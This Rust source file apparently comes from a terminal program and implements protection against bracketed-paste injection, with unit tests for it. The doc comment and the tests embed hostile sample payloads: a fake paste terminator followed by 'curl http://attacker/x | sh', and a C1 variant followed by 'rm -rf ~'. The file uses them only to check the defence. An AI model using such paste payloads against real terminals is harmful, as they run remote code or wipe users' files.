//! Bracketed paste into a live pane, with the payload unable to end the paste
//! early (#1003).
//!
//! ```text
//! clipboard ──▶ sanitize (no ESC, no C1 CSI) ──▶ ESC[200~ text ESC[201~ ──▶ PTY
//! ```
//!
//! A pane in bracketed-paste mode treats everything between the start and end
//! markers as text, carriage returns included. A payload that carries its own
//! `ESC[201~` ends the paste there, and every byte after it arrives as typed
//! keys: `harmless\x1b[201~\rcurl http://attacker/x | sh\r` runs the command.
//! Every ESC (and the one-byte C1 CSI, U+009B) is removed from the payload
//! before it is wrapped, so no escape sequence in it can act, and the
//! terminator's remaining characters (`[201~`) land as the literal text they
//! are. Line breaks and tabs are kept: a multi-line paste into a prompt stays
//! multi-line.

use std::borrow::Cow;

/// What a pane in bracketed-paste mode reads as the start of a paste.
pub const PASTE_START: &[u8] = b"\x1b[200~";
/// What it reads as the end of one.
pub const PASTE_END: &[u8] = b"\x1b[201~";

/// `text` with every character that could open an escape sequence removed:
/// ESC, and the C1 control sequence introducer that some parsers treat as
/// `ESC [`. Borrowed when there was nothing to remove.
#[must_use]
pub fn sanitize(text: &str) -> Cow<'_, str> {
    if text.chars().any(opens_a_sequence) {
        Cow::Owned(text.chars().filter(|c| !opens_a_sequence(*c)).collect())
    } else {
        Cow::Borrowed(text)
    }
}

/// `text` as one bracketed paste: the markers around the sanitized payload, so
/// the pane sees exactly one paste and nothing after it.
#[must_use]
pub fn bracketed(text: &str) -> Vec<u8> {
    let text = sanitize(text);
    let mut bytes = Vec::with_capacity(text.len() + PASTE_START.len() + PASTE_END.len());
    bytes.extend_from_slice(PASTE_START);
    bytes.extend_from_slice(text.as_bytes());
    bytes.extend_from_slice(PASTE_END);
    bytes
}

/// Input a terminal emulator produced, with a bracketed paste in it rebuilt
/// from its sanitized payload.
///
/// For a surface whose emulator wraps the paste itself (xterm.js in the
/// desktop): a paste arrives as one input chunk that starts with
/// [`PASTE_START`] and ends with [`PASTE_END`], and whatever lies between them
/// is the clipboard's. Any other input, a typed key or a paste into a pane
/// that did not ask for bracketed mode, is returned as it came.
#[must_use]
pub fn rebracket(input: &[u8]) -> Cow<'_, [u8]> {
    let Some(inner) = input.strip_prefix(PASTE_START).and_then(|rest| rest.strip_suffix(PASTE_END))
    else {
        return Cow::Borrowed(input);
    };
    let payload = String::from_utf8_lossy(inner);
    if !payload.chars().any(opens_a_sequence) {
        return Cow::Borrowed(input);
    }
    Cow::Owned(bracketed(&payload))
}

const fn opens_a_sequence(c: char) -> bool {
    matches!(c, '\u{1b}' | '\u{9b}')
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The payload from #1003: a terminator, then a command and a return.
    const HOSTILE: &str = "harmless\x1b[201~\rcurl http://attacker/x | sh\r";

    /// Every marker in `bytes`, in order.
    fn markers(bytes: &[u8]) -> Vec<&'static str> {
        let mut found = Vec::new();
        for at in 0..bytes.len() {
            if bytes[at..].starts_with(PASTE_START) {
                found.push("start");
            } else if bytes[at..].starts_with(PASTE_END) {
                found.push("end");
            }
        }
        found
    }

    #[test]
    fn a_payload_carrying_the_terminator_lands_as_literal_text() {
        let bytes = bracketed(HOSTILE);
        assert_eq!(markers(&bytes), vec!["start", "end"], "exactly one paste");
        assert!(bytes.starts_with(PASTE_START) && bytes.ends_with(PASTE_END));
        let inside = &bytes[PASTE_START.len()..bytes.len() - PASTE_END.len()];
        assert_eq!(
            inside, b"harmless[201~\rcurl http://attacker/x | sh\r",
            "the keystrokes stay inside the paste, as text"
        );
        assert!(!inside.contains(&0x1b), "no escape survives");
    }

    #[test]
    fn a_c1_introducer_cannot_end_the_paste_either() {
        let bytes = bracketed("a\u{9b}201~\rrm -rf ~\r");
        assert_eq!(markers(&bytes), vec!["start", "end"]);
        assert!(!String::from_utf8_lossy(&bytes).contains('\u{9b}'));
    }

    #[test]
    fn ordinary_text_is_unchanged_line_breaks_and_tabs_included() {
        let text = "fn main() {\n\tprintln!(\"hi\");\r\n}\n";
        assert!(matches!(sanitize(text), Cow::Borrowed(_)));
        assert_eq!(
            bracketed(text),
            [PASTE_START, text.as_bytes(), PASTE_END].concat()
        );
    }

    #[test]
    fn an_emulator_paste_is_rebuilt_only_when_its_payload_needs_it() {
        let hostile = [PASTE_START, HOSTILE.as_bytes(), PASTE_END].concat();
        let rebuilt = rebracket(&hostile);
        assert_eq!(rebuilt.as_ref(), bracketed(HOSTILE).as_slice());
        assert_eq!(markers(&rebuilt), vec!["start", "end"]);

        let clean = [PASTE_START, b"ls -la\r".as_slice(), PASTE_END].concat();
        assert!(matches!(rebracket(&clean), Cow::Borrowed(_)));
    }

    #[test]
    fn typed_input_is_never_touched() {
        for input in [
            b"\x1b".as_slice(),
            b"\x1b[A",
            b"\x1b[201~",
            b"plain text\r",
            b"\x1b[200~ unterminated",
        ] {
            assert!(
                matches!(rebracket(input), Cow::Borrowed(same) if same == input),
                "{input:?}"
            );
        }
    }
}
